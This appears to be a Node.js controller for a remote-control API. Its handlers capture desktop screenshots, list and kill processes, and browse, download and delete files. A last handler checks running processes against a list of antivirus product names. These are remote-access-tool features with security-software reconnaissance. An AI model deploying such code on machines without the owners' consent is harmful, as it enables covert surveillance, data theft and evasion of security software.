const screenshot = require('screenshot-desktop');
let psList;
async function loadPsList() {
  if (!psList) {
    psList = (await import('ps-list')).default;
  }
  return psList;
}
const fs = require('fs');
const path = require('path');

const BASE_DIR = path.resolve(process.env.FILE_ROOT || process.cwd());

function safePath(p) {
  const resolved = path.resolve(BASE_DIR, p || '');
  if (!resolved.startsWith(BASE_DIR)) {
    throw new Error('Invalid path');
  }
  return resolved;
}

exports.captureScreenshot = async (req, res) => {
  try {
    const img = await screenshot({ format: 'png' });
    res.json({ status: 'success', data: img.toString('base64') });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};

exports.listProcesses = async (req, res) => {
  try {
    const list = await (await loadPsList())();
    res.json({ status: 'success', data: list });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};

exports.killProcess = async (req, res) => {
  try {
    const pid = parseInt(req.params.pid, 10);
    if (Number.isNaN(pid)) {
      return res.status(400).json({ status: 'error', message: 'Invalid pid' });
    }
    const processes = await (await loadPsList())();
    if (!processes.some(p => p.pid === pid)) {
      return res.status(404).json({ status: 'error', message: 'Process not found' });
    }
    process.kill(pid);
    res.json({ status: 'success' });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};

exports.listFiles = (req, res) => {
  try {
    const dir = safePath(req.query.path || '.');
    const files = fs.readdirSync(dir).map(name => {
      const stat = fs.statSync(path.join(dir, name));
      return { name, isDir: stat.isDirectory(), size: stat.size };
    });
    res.json({ status: 'success', files });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};

exports.downloadFile = (req, res) => {
  try {
    const filePath = safePath(req.query.path || '');
    res.download(filePath);
  } catch (e) {
    res.status(400).json({ status: 'error', message: e.message });
  }
};

exports.deleteFile = (req, res) => {
  try {
    const filePath = safePath(req.query.path || '');
    fs.unlinkSync(filePath);
    res.json({ status: 'success' });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};

const avProcesses = ['avast', 'avg', 'defender', 'kaspersky', 'mcafee', 'clam', 'sophos', 'bitdefender', 'eset'];
exports.detectSecuritySoftware = async (req, res) => {
  try {
    const list = await (await loadPsList())();
    const active = list.filter(p => avProcesses.some(n => p.name.toLowerCase().includes(n)));
    res.json({ status: 'success', software: active.map(p => p.name) });
  } catch (e) {
    res.status(500).json({ status: 'error', message: e.message });
  }
};
